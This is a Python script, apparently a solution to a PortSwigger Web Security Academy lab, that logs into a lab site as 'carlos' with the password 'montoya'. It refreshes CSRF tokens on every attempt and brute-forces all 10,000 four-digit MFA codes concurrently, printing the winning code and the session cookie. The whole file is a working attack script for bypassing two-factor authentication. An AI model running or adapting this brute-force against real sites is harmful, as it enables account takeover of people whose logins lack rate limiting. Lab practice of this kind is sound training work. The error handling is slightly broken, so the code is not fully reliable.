import asyncio
import aiohttp
import re

# URLs and Headers
login_url = 'https://0a5600e904330fb0801b8a2b00d500de.web-security-academy.net/login' # Replace it with yours
login2_url = 'https://0a5600e904330fb0801b8a2b00d500de.web-security-academy.net/login2' # Replace it with yours

headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html",
    "Accept-Language": "en-US,en;q=0.6",
    "Accept-Encoding": "gzip, deflate, br",
    "Upgrade-Insecure-Requests": "1"
}

found = asyncio.Event()

# Extract CSRF token
def extract_csrf(text):
    match = re.search(r'name="csrf"\s+value="([^"]+)"', text)
    return match.group(1) if match else None
# Attempt MFA code
async def attempt_code(sem, i):
    async with sem:
        if found.is_set():
            return

        try:
            async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar()) as session:
                # Step 1: GET the login page and extract CSRF
                async with session.get(login_url, headers=headers) as r1:
                    html1 = await r1.text()
                    csrf1 = extract_csrf(html1)
                    if not csrf1:
                        print(f"[!] No CSRF token on iteration {i}")
                        return

                # Step 2: POST login credentials with CSRF
                login_data = {
                    'csrf': csrf1,
                    'username': 'carlos',
                    'password': 'montoya'
                }

                async with session.post(
                    login_url,
                    headers={**headers, "Referer": login_url},
                    data=login_data,
                    allow_redirects=True
                ) as r2:
                    html2 = await r2.text()
                    mfa_csrf = extract_csrf(html2)
                    mfa_session = session
                    cookies = session.cookie_jar.filter_cookies(login_url)
                    mysession = cookies.get('session')
                    if not mfa_csrf:
                        print(f"[!] No MFA CSRF on iteration {i}")
                        return

                # Step 3: Try MFA codes
                payload = f"{i:04d}"
                mfa_data = {
                    "csrf": mfa_csrf,
                    "mfa-code": payload
                }

                try:
                    async with mfa_session.post(
                        login2_url,
                        headers={**headers, "Referer": login2_url},
                        data=mfa_data,
                        allow_redirects=True
                    ) as r3:
                        html3 = await r3.text()
                        status = r3.status
                except aiohttp.ClientError as e:
                    print(f"[!] Network error for code {payload}: {e}")

                if status == 200:
                    with open('./logs.txt', 'a') as file:
                        file.write(f"[{status}] Tried: {payload}, Session: {mysession.value if mysession else 'None'}, CSRF: {mfa_csrf}\n")

                if status == 400:
                    with open('./logs.txt', 'a') as file:
                        file.write(f"[!] 400 Bad Request for code {payload} — Session: {mysession.value} CSRF: {mfa_csrf}\n")

                if 'Log out' in html3:
                    found.set()
                    cookies = session.cookie_jar.filter_cookies(login2_url)
                    print(f"Success! Code: {payload}")
                    print(f"Session Cookie: {cookies.get('session')}") 
                    return


        except Exception as e:
            print(f"[!] Error in iteration {i}: {e}")

# Main event loop
async def main():
    sem = asyncio.Semaphore(10)  # Max concurrent requests (Dependent on the network's capability)
    tasks = [attempt_code(sem, i) for i in range(0, 10000)]
    await asyncio.gather(*tasks)
    if not found.is_set():
        print("[*] Done. No valid code found.")

# Entry
if __name__ == "__main__":
    asyncio.run(main())